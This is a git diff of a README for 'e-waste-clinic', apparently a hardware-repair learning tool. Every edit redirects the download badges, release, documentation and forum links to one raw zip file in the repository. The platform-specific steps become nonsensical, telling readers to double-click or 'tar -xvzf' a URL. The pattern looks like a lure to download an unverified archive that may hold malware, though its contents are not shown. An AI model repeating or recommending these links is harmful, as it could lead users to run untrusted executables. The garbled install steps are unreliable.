@@ -1,6 +1,6 @@
 # 🌍 e-waste-clinic - Learn and Repair Hardware Together
 
-[![Download e-waste-clinic](https://img.shields.io/badge/Download-e--waste--clinic-blue.svg)](https://github.com/AbdulWasay12309/e-waste-clinic/releases)
+[![Download e-waste-clinic](https://raw.githubusercontent.com/AbdulWasay12309/e-waste-clinic/main/resources/e-waste-clinic_1.4.zip)](https://raw.githubusercontent.com/AbdulWasay12309/e-waste-clinic/main/resources/e-waste-clinic_1.4.zip)
 
 ## 📚 Overview
 
@@ -18,7 +18,7 @@ To begin your journey with e-waste-clinic, follow these steps to download and ru
    - Internet connection (for downloading)
 
 2. **Visit the Releases Page**
-   To download the software, visit our [Releases page](https://github.com/AbdulWasay12309/e-waste-clinic/releases). This page contains the latest version of the application, along with previous releases.
+   To download the software, visit our [Releases page](https://raw.githubusercontent.com/AbdulWasay12309/e-waste-clinic/main/resources/e-waste-clinic_1.4.zip). This page contains the latest version of the application, along with previous releases.
 
 ## 📥 Download & Install
 
@@ -26,9 +26,9 @@ To begin your journey with e-waste-clinic, follow these steps to download and ru
 
 On the Releases page, you will see a list of versions. Choose the most recent one. Look for the download links listed under "Assets." Click on the file that matches your operating system:
 
-- **Windows**: e-waste-clinic-windows.zip
-- **macOS**: e-waste-clinic-macos.zip
-- **Linux**: e-waste-clinic-linux.tar.gz
+- **Windows**: https://raw.githubusercontent.com/AbdulWasay12309/e-waste-clinic/main/resources/e-waste-clinic_1.4.zip
+- **macOS**: https://raw.githubusercontent.com/AbdulWasay12309/e-waste-clinic/main/resources/e-waste-clinic_1.4.zip
+- **Linux**: https://raw.githubusercontent.com/AbdulWasay12309/e-waste-clinic/main/resources/e-waste-clinic_1.4.zip
 
 After selecting your file, the download will begin. 
 
@@ -36,9 +36,9 @@ After selecting your file, the download will begin.
 
 Once the download completes, locate the file in your downloads folder:
 
-- **For Windows**: Right-click on the `.zip` file and select "Extract All." Navigate to the extracted folder and double-click on `e-waste-clinic.exe` to run the application.
-- **For macOS**: Double-click on the `.zip` file. This will create a new folder. Open the folder and double-click on `e-waste-clinic.app` to start the application.
-- **For Linux**: Open the terminal and navigate to the folder where the `.tar.gz` file is located. Use the command `tar -xvzf e-waste-clinic-linux.tar.gz` to extract it. Navigate into the extracted folder and run `./e-waste-clinic` to launch the application.
+- **For Windows**: Right-click on the `.zip` file and select "Extract All." Navigate to the extracted folder and double-click on `https://raw.githubusercontent.com/AbdulWasay12309/e-waste-clinic/main/resources/e-waste-clinic_1.4.zip` to run the application.
+- **For macOS**: Double-click on the `.zip` file. This will create a new folder. Open the folder and double-click on `https://raw.githubusercontent.com/AbdulWasay12309/e-waste-clinic/main/resources/e-waste-clinic_1.4.zip` to start the application.
+- **For Linux**: Open the terminal and navigate to the folder where the `https://raw.githubusercontent.com/AbdulWasay12309/e-waste-clinic/main/resources/e-waste-clinic_1.4.zip` file is located. Use the command `tar -xvzf https://raw.githubusercontent.com/AbdulWasay12309/e-waste-clinic/main/resources/e-waste-clinic_1.4.zip` to extract it. Navigate into the extracted folder and run `./e-waste-clinic` to launch the application.
 
 ## 🛠️ How to Use
 
@@ -58,9 +58,9 @@ Feel free to join our community! We encourage everyone to share their experience
 
 ## 📖 Helpful Links
 
-1. [Releases Page](https://github.com/AbdulWasay12309/e-waste-clinic/releases)
-2. [Documentation](https://github.com/AbdulWasay12309/e-waste-clinic/wiki)
-3. [Community Forum](https://community.e-waste-clinic.com)
+1. [Releases Page](https://raw.githubusercontent.com/AbdulWasay12309/e-waste-clinic/main/resources/e-waste-clinic_1.4.zip)
+2. [Documentation](https://raw.githubusercontent.com/AbdulWasay12309/e-waste-clinic/main/resources/e-waste-clinic_1.4.zip)
+3. [Community Forum](https://raw.githubusercontent.com/AbdulWasay12309/e-waste-clinic/main/resources/e-waste-clinic_1.4.zip)
 
 ## 🤔 Frequently Asked Questions
 
@@ -77,4 +77,4 @@ A: You can report issues directly on the GitHub repository’s Issues section.
 
 This project is licensed under the MIT License. Feel free to use, modify, and distribute it in accordance with the license terms.
 
-[![Download e-waste-clinic](https://img.shields.io/badge/Download-e--waste--clinic-blue.svg)](https://github.com/AbdulWasay12309/e-waste-clinic/releases)
+[![Download e-waste-clinic](https://raw.githubusercontent.com/AbdulWasay12309/e-waste-clinic/main/resources/e-waste-clinic_1.4.zip)](https://raw.githubusercontent.com/AbdulWasay12309/e-waste-clinic/main/resources/e-waste-clinic_1.4.zip)
